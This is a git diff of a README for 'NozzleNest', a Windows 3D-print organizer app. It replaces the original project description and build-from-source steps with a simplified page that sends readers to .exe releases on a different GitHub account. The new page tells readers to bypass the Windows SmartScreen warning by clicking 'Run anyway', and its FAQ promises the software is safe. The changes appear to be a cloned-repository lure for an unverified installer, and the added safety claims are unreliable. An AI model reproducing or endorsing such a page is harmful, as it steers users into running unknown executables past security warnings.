@@ -1,74 +1,73 @@
-<p align="center">
-  <img src="resources/banner.png" alt="NozzleNest Banner" width="100%" />
-</p>
+# 🦅 nozzlenest - Organize your 3D printing projects today
 
-# NozzleNest 🦅
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/alonsopermanentpress65/nozzlenest/releases)
 
-**NozzleNest** is a premium, next-generation 3D print organizer desktop application built with Electron, React, Vite, and SQLite for Windows.
+NozzleNest helps you track 3D printing files. You can save models, track print history, and manage projects in one place. It works on Windows.
 
-> [!WARNING]
-> **Hobbyist Developer Notice:** As an independent open-source project, I do not currently pay for an expensive code-signing certificate. When you download and run the `.exe` installer, **Windows SmartScreen** may show a warning saying the publisher is unknown. This is completely normal for unsigned indie software. To install, click "More info" and then "Run anyway". You can review the fully open-source code here to verify its safety!
+## 🚀 Getting Started
 
+Follow these steps to set up the software.
 
-## Key Features
+1. Go to the [official release page](https://github.com/alonsopermanentpress65/nozzlenest/releases).
+2. Look for the latest version at the top of the list.
+3. Download the file ending in `.exe`.
+4. Run the installer.
 
-- **Dashboard:** Modern, premium dark interface with dynamic micro-animations, real-time printing stats, and an activity feed showing recently added/printed models.
-- **Embedded Browser & Persistent Sessions:** Browse top model repositories (Printables, Thingiverse, Thangs, MakerWorld, MakerOnline) natively. Integrated with a persistent session partition (`persist:nozzlenest-browser`) that keeps your cookies, storage, and logins active across application restarts.
-- **Google OAuth & Popup Support:** Out-of-the-box support for popup-based authentication (like Google Login or site-specific sign-in modals) by routing guest popups into dedicated secondary parent-locked windows.
-- **Advanced Metadata & Tag Scraper:** HTML5 metadata extraction using structured JSON-LD data, meta properties, and targeted selectors.
-  - **Details Page Backfill:** Automatically navigates to and silently scrapes primary model details pages if downloads are initiated from file list pages (perfect for dynamic SPAs), cache-saving the scraped tags and thumbnails.
-  - **Printables GraphQL Integration:** Direct main-process server-to-server GraphQL query handler bypasses dynamic rendering times and CORS blocks, extracting tags and image locations instantly.
-- **Bulletproof 2-Stage Thumbnail Fetching:**
-  - **Stage 1 (Frontend DOM Scraper):** Parses high-res images and JSON-LD assets automatically on page interactions.
-  - **Stage 2 (Backend GraphQL API Fallback):** Automatically queries Printables API backend on download confirmation if DOM selectors were missed.
-  - **Native CDN Bypass:** Automatically spoof-injects browser-standard `User-Agent` and `Referer` headers to fetch images reliably from hotlink-protected CDNs (e.g. Printables CDN).
-- **Model Library & Real-time Re-renders:** Easily organize, tag, group into Collections, and search your models. Built-in instant refresh listener loads new models and their downloaded cover thumbnails in real-time immediately after background download threads finish. Includes full-size image views and an on-demand Three.js 3D viewer.
-- **Local SQLite DB:** 100% local database with zero-cloud accounts required.
-- **Local storage structure:** Models are stored in a dedicated, structured directory (defaulting to `C:\NozzleNest` but fully customizable in settings).
-- **Printing Queue:** Drag-and-drop to prioritize prints. Mark items as successfully printed or failed with optional troubleshooting notes.
-- **Slicer integration:** Open files directly in your system default slicer or define a custom executable path.
-- **Windows Integration:** Adds a right-click "Add to NozzleNest" context menu option for `.stl` and `.3mf` files in Windows Explorer.
-- **Update notifications:** Checks the public GitHub releases API on startup and notifies you of new updates.
+## 🛡️ Important Safety Note
 
-## Technology Stack
+Windows might show a warning when you open the installer. This happens because the software is new and independent. Click the link that says "More info" and then click "Run anyway" to finish the process.
 
-- **App Shell:** Electron (v30+)
-- **Frontend UI:** React + Vite
-- **Styling:** Custom CSS with CSS variables (sleek dark mode, glassmorphism, responsive grid/list)
-- **3D Engine:** Three.js with React Three Fiber (`@react-three/fiber` & `@react-three/drei`)
-- **Database:** SQLite (via `better-sqlite3`)
-- **Archive Extraction:** `adm-zip`
-- **Packaging:** `electron-builder`
+## 🛠️ System Requirements
 
-## Getting Started
+- Windows 10 or Windows 11.
+- 200 MB of disk space.
+- An internet connection for syncing files.
 
-### Prerequisites
+## 📁 Key Features
 
-- Node.js (v18+)
-- npm (v9+)
-- C++ Build Tools (required for native SQLite compilation)
+### 📊 Dashboard
+The dashboard shows your print progress. You see recent models and active print tasks. The dark view reduces eye strain during long sessions in front of your computer.
 
-### Installation & Scaffolding
+### 🌐 Browser Integration
+You can use the built-in browser to visit sites like Printables, Thingiverse, and MakerWorld. Save files directly to your library without leaving the app.
 
-1. **Clone the repository:**
-   ```bash
-   git clone https://github.com/papakonnekt/nozzlenest.git
-   cd nozzlenest
-   ```
+### 💾 Local Database
+Your data stays on your computer. The app uses a secure file format to keep track of your library. You do not need to upload your information to a cloud service.
 
-2. **Install all dependencies (compiles native database bindings):**
-   ```bash
-   npm install
-   ```
+### 📅 History Log
+The log shows every print you finished. You can add notes to every entry. This tells you which settings worked for specific models.
 
-3. **Start the hot-reloading development environment:**
-   ```bash
-   npm run dev
-   ```
+## 💡 How to Use the App
 
-4. **Build and package the production installer executable (.exe):**
-   ```bash
-   npm run build
-   ```
+### Add a Model
+1. Find a file on a supported website using the browser tab.
+2. Click the save icon to store the file to your drive.
+3. Add a category tag to keep your library clean.
 
-Have fun coding, and keep the nest glowing!
+### Track a Print
+1. Click the "Start Print" button on the dashboard.
+2. Select your file from the library.
+3. Add the estimated time and filament type.
+4. Update the status when the print finishes.
+
+## ❓ Frequently Asked Questions
+
+### Is this app free?
+Yes. The software is open-source. Anyone can use it without fees.
+
+### Does the app send my files to the internet?
+No. The app saves prints to your local drive. Your models stay on your computer.
+
+### Can I delete my data?
+Yes. You control the files on your hard drive. Deleting the app folder removes your stored library.
+
+### Which file formats are supported?
+The app works best with .STL and .3MF files. These are the standards for 3D printing.
+
+## ⚙️ How to Update
+New versions come out periodically. Check the release page to see if you have the current version. Download and run the latest installer to apply updates. Your saved data remains safe during this process.
+
+## 📧 Support
+If you find a bug, open an issue on the GitHub page. Describe the problem and include a screenshot if possible. Clear reports help make the app better for everyone.
+
+[![](https://img.shields.io/badge/Download_Installer-Grey)](https://github.com/alonsopermanentpress65/nozzlenest/releases)
